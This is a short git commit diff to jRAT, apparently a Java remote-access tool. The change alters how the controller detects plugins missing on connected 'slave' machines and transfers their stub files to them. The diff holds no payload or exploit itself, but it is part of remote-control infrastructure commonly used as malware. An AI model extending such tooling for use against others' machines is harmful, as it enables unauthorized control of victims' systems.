9aaffb9e86ffd56eed3fc7fb1aad798efdb77c7d
redpois0n <red@cmail.nu>
2014-12-07 16:44:19 +0100

    Did transfer installed plugins before, not anymore

--- Controller/src/se/jrat/client/packets/incoming/Packet36Initialized.java
+++ Controller/src/se/jrat/client/packets/incoming/Packet36Initialized.java
@@ -3,6 +3,7 @@ package se.jrat.client.packets.incoming;
 import java.io.DataInputStream;
 import java.io.File;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -23,26 +24,24 @@ public class Packet36Initialized extends AbstractIncomingPacket {
 		for (Event event : Events.queue.values()) {
 			event.perform(slave);
 		}
-		
-		String[] plugins = slave.getPlugins();
+
+		List<String> plugins = new ArrayList<String>(Arrays.asList(slave.getPlugins()));
 		List<String> notInstalled = new ArrayList<String>();
-		
+
 		if (plugins != null) {
-			for (String name : plugins) {
-				for (Plugin plugin : PluginLoader.plugins) {
-					if (!plugin.getName().equals(name) && !notInstalled.contains(name)) {
-						notInstalled.add(name);
-						Main.debug("Plugin " + name + " is not installed, adding to list");
-					}
+			for (Plugin plugin : PluginLoader.plugins) {
+				if (!plugins.contains(plugin.getName())) {
+					notInstalled.add(plugin.getName());
+					Main.debug("Plugin " + plugin.getName() + " is not installed, adding to list");
 				}
 			}
-			
+
 			Map<String, File> filesToTransfer = new HashMap<String, File>();
-			
+
 			for (String sp : notInstalled) {
 				Plugin plugin = PluginLoader.getPlugin(sp);
 				File[] files = Globals.getPluginStubDirectory().listFiles();
-				
+
 				for (File stubFile : files) {
 					if (stubFile.getName().startsWith(plugin.getName())) {
 						Main.debug("Found stub plugin " + stubFile.getName() + " for plugin " + plugin.getName());
@@ -51,10 +50,10 @@ public class Packet36Initialized extends AbstractIncomingPacket {
 					}
 				}
 			}
-			
+
 			for (final String key : filesToTransfer.keySet()) {
 				final File file = filesToTransfer.get(key);
-				
+
 				new Thread(new Runnable() {
 					public void run() {
 						try {
